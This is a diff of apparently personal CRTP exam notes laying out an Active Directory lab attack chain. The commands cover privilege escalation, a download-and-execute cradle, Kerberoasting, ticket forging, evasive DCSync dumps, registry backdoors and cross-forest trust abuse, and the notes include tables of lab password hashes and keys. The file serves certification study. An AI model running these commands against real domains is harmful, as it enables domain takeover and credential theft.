@@ -1,4 +1,4 @@
-# CRTP Exam — Master Attack Chain
+# 🎓 Exam-Master-Notes-CRTP
 
 > Follow top to bottom. Each phase links to the detailed cheatsheet or lab notes.
 >
@@ -6,7 +6,7 @@
 >
 > All tools at `C:\AD\Tools\`. Student VM IP: `172.16.100.X`
 
----
+***
 
 ## 0. Setup — Every new shell
 
@@ -15,15 +15,14 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 . C:\AD\Tools\PowerView.ps1
 ```
 
-> Admin shell? Use `RunWithPathAsAdmin.bat` instead.
-> Import ADModule if needed:
+> Admin shell? Use `RunWithPathAsAdmin.bat` instead. Import ADModule if needed:
 
 ```
 Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
 Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
 ```
 
----
+***
 
 ## 1. Enumeration
 
@@ -82,12 +81,11 @@ C:\AD\Tools\Certify.exe find /enrolleeSuppliesSubject
 C:\AD\Tools\Certify.exe find /vulnerable
 ```
 
----
+***
 
 ## 2. Local Privilege Escalation
 
-> Full details → [cheatsheet-fast-commands-privilege-escalation.md](cheatsheet-fast-commands-privilege-escalation.md)
-> Lab notes → [LO5](learning-objectives/learning-objetive-5.md)
+> Full details → [cheatsheet-fast-commands-privilege-escalation.md](cheatsheet-fast-commands-privilege-escalation.md) Lab notes → [LO5](learning-objectives/learning-objetive-5.md)
 
 ```
 . C:\AD\Tools\PowerUp.ps1
@@ -106,12 +104,11 @@ Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log
 ```
 
----
+***
 
 ## 3. Lateral Movement — Get to ciadmin / dcorp-ci
 
-> Full details → [cheatsheet-fast-commands-lateral-movement.md](cheatsheet-fast-commands-lateral-movement.md)
-> Lab notes → [LO5](learning-objectives/learning-objetive-5.md) | [LO6](learning-objectives/learning-objetive-6.md)
+> Full details → [cheatsheet-fast-commands-lateral-movement.md](cheatsheet-fast-commands-lateral-movement.md) Lab notes → [LO5](learning-objectives/learning-objetive-5.md) | [LO6](learning-objectives/learning-objetive-6.md)
 
 ### Jenkins (dcorp-ci — 172.16.3.11:8080)
 
@@ -135,7 +132,7 @@ iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps
 
 > Lab notes → [LO6](learning-objectives/learning-objetive-6.md) | Full steps in [cheatsheet-fast-commands-lateral-movement.md](cheatsheet-fast-commands-lateral-movement.md)
 
----
+***
 
 ## 4. Kerberoasting → svcadmin password
 
@@ -158,7 +155,7 @@ C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerbero
 ## svcadmin : *ThisisBlasphemyThisisMadness!!
 ```
 
----
+***
 
 ## 5. OverPass-the-Hash → DA shell
 
@@ -172,7 +169,7 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin 
 
 > New cmd window opens as svcadmin (Domain Admin). All DA operations below from this window.
 
----
+***
 
 ## 6. Credential Dump — dcorp-adminsrv
 
@@ -186,11 +183,12 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sek
 ```
 
 > Save these:
-> - `appadmin` aes256: `68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb`
-> - `websvc` aes256: `2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7`
-> - `dcorp-adminsrv$` aes256: `e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51`
+>
+> * `appadmin` aes256: `68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb`
+> * `websvc` aes256: `2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7`
+> * `dcorp-adminsrv$` aes256: `e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51`
 
----
+***
 
 ## 7. DCSync — Extract krbtgt hash
 
@@ -200,8 +198,7 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sek
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
 ```
 
-> krbtgt AES256: `154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848`
-> Domain SID: `S-1-5-21-719815819-3726368948-3917688648`
+> krbtgt AES256: `154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848` Domain SID: `S-1-5-21-719815819-3726368948-3917688648`
 
 Also dump dcorp-dc$ machine hash (needed for Silver Ticket):
 
@@ -209,12 +206,11 @@ Also dump dcorp-dc$ machine hash (needed for Silver Ticket):
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\dcorp-dc$" "exit"
 ```
 
----
+***
 
 ## 8. Tickets — Golden / Silver / Diamond
 
-> Full details → [cheatsheet-fast-commands-post-explotation.md](cheatsheet-fast-commands-post-explotation.md)
-> Lab notes → [LO8](learning-objectives/learning-objetive-8.md) | [LO9](learning-objectives/learning-objetive-9.md) | [LO10](learning-objectives/learning-objetive-10.md)
+> Full details → [cheatsheet-fast-commands-post-explotation.md](cheatsheet-fast-commands-post-explotation.md) Lab notes → [LO8](learning-objectives/learning-objetive-8.md) | [LO9](learning-objectives/learning-objetive-9.md) | [LO10](learning-objectives/learning-objetive-10.md)
 
 ### Golden Ticket
 
@@ -240,12 +236,11 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:154cb6
 winrs -r:dcorp-dc cmd
 ```
 
----
+***
 
 ## 9. Persistence
 
-> Full details → [cheatsheet-fast-commands-persistence.md](cheatsheet-fast-commands-persistence.md)
-> Lab notes → [LO11](learning-objectives/learning-objetive-11.md) | [LO13](learning-objectives/learning-objetive-13.md)
+> Full details → [cheatsheet-fast-commands-persistence.md](cheatsheet-fast-commands-persistence.md) Lab notes → [LO11](learning-objectives/learning-objetive-11.md) | [LO13](learning-objectives/learning-objetive-13.md)
 
 ### DSRM (LO11)
 
@@ -282,12 +277,11 @@ Set-RemotePSRemoting -SamAccountName studentx -ComputerName dcorp-dc.dollarcorp.
 Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee studentx -Verbose
 ```
 
----
+***
 
 ## 10. Domain Escalation — Unconstrained Delegation → EA
 
-> Full details → [cheatsheet-fast-commands-post-explotation.md](cheatsheet-fast-commands-post-explotation.md)
-> Lab notes → [LO15](learning-objectives/learning-objetive-15.md)
+> Full details → [cheatsheet-fast-commands-post-explotation.md](cheatsheet-fast-commands-post-explotation.md) Lab notes → [LO15](learning-objectives/learning-objetive-15.md)
 
 ### Find unconstrained delegation machine
 
@@ -344,7 +338,7 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:BASE64TICK
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
 ```
 
----
+***
 
 ## 11. Constrained Delegation (LO16)
 
@@ -366,7 +360,7 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-admins
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
 ```
 
----
+***
 
 ## 12. RBCD / ACL Write (LO17)
 
@@ -392,12 +386,11 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-stdX$ 
 winrs -r:dcorp-mgmt cmd
 ```
 
----
+***
 
 ## 13. Cross-Forest Escalation — mcorp via Trust Key (LO18)
 
-> Full details → [cheatsheet-fast-commands-domain-forest-privilege-escalation.md](cheatsheet-fast-commands-domain-forest-privilege-escalation.md)
-> Lab notes → [LO18](learning-objectives/learning-objetive-18.md)
+> Full details → [cheatsheet-fast-commands-domain-forest-privilege-escalation.md](cheatsheet-fast-commands-domain-forest-privilege-escalation.md) Lab notes → [LO18](learning-objectives/learning-objetive-18.md)
 
 ### Extract trust key (dcorp → mcorp)
 
@@ -415,7 +408,7 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/m
 winrs -r:mcorp-dc.moneycorp.local cmd
 ```
 
----
+***
 
 ## 14. Cross-Forest Escalation — mcorp via krbtgt hash (LO19)
 
@@ -428,7 +421,7 @@ winrs -r:mcorp-dc.moneycorp.local cmd
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
 ```
 
----
+***
 
 ## 15. External Forest — eurocorp SharedwithDCorp (LO20)
 
@@ -450,12 +443,11 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/e
 dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
 ```
 
----
+***
 
 ## 16. AD CS — ESC1 / ESC3 (LO21)
 
-> Full details → [cheatsheet-fast-commands-domain-forest-privilege-escalation.md](cheatsheet-fast-commands-domain-forest-privilege-escalation.md)
-> Lab notes → [LO21](learning-objectives/learning-objective-21.md)
+> Full details → [cheatsheet-fast-commands-domain-forest-privilege-escalation.md](cheatsheet-fast-commands-domain-forest-privilege-escalation.md) Lab notes → [LO21](learning-objectives/learning-objective-21.md)
 
 ### ESC1 — DA (template: HTTPSCertificates)
 
@@ -488,26 +480,26 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:administr
 winrs -r:dcorp-dc cmd /c set username
 ```
 
----
+***
 
 ## Quick Reference — Key Hashes & SIDs
 
-| Account | AES256 | NTLM / RC4 |
-|---|---|---|
-| svcadmin | `6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011` | — |
-| krbtgt (dcorp) | `154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848` | `4e9815869d2090ccfca61c1fe0d23986` |
-| dcorp-dc$ | — | `c6a60b67476b36ad7838d7875c33c2c3` |
-| DSRM Admin (dcorp-dc) | — | `a102ad5753f4c441e3af31c97fad86fd` |
-| appadmin | `68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb` | — |
-| websvc | `2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7` | — |
-| dcorp-adminsrv$ | `e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51` | — |
-| Trust key dcorp→mcorp (rc4) | — | `132f54e05f7c3db02e97c00ff3879067` |
-| Trust key dcorp→eurocorp (aes256) | `a18ce7d3072431334db257ab167347b20a1f59c257f808f7e6fc0cb89ace8bac` | — |
-| krbtgt (mcorp) | — | `a0981492d5dfab1ae0b97b51ea895ddf` |
+| Account                           | AES256                                                             | NTLM / RC4                         |
+| --------------------------------- | ------------------------------------------------------------------ | ---------------------------------- |
+| svcadmin                          | `6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011` | —                                  |
+| krbtgt (dcorp)                    | `154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848` | `4e9815869d2090ccfca61c1fe0d23986` |
+| dcorp-dc$                         | —                                                                  | `c6a60b67476b36ad7838d7875c33c2c3` |
+| DSRM Admin (dcorp-dc)             | —                                                                  | `a102ad5753f4c441e3af31c97fad86fd` |
+| appadmin                          | `68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb` | —                                  |
+| websvc                            | `2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7` | —                                  |
+| dcorp-adminsrv$                   | `e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51` | —                                  |
+| Trust key dcorp→mcorp (rc4)       | —                                                                  | `132f54e05f7c3db02e97c00ff3879067` |
+| Trust key dcorp→eurocorp (aes256) | `a18ce7d3072431334db257ab167347b20a1f59c257f808f7e6fc0cb89ace8bac` | —                                  |
+| krbtgt (mcorp)                    | —                                                                  | `a0981492d5dfab1ae0b97b51ea895ddf` |
 
-| Name | Value |
-|---|---|
-| Domain SID (dcorp) | `S-1-5-21-719815819-3726368948-3917688648` |
-| Enterprise Admins SID | `S-1-5-21-335606122-960912869-3279953914-519` |
-| DC IP (dcorp-dc) | `172.16.2.1` |
-| CA | `mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA` |
+| Name                  | Value                                            |
+| --------------------- | ------------------------------------------------ |
+| Domain SID (dcorp)    | `S-1-5-21-719815819-3726368948-3917688648`       |
+| Enterprise Admins SID | `S-1-5-21-335606122-960912869-3279953914-519`    |
+| DC IP (dcorp-dc)      | `172.16.2.1`                                     |
+| CA                    | `mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA` |
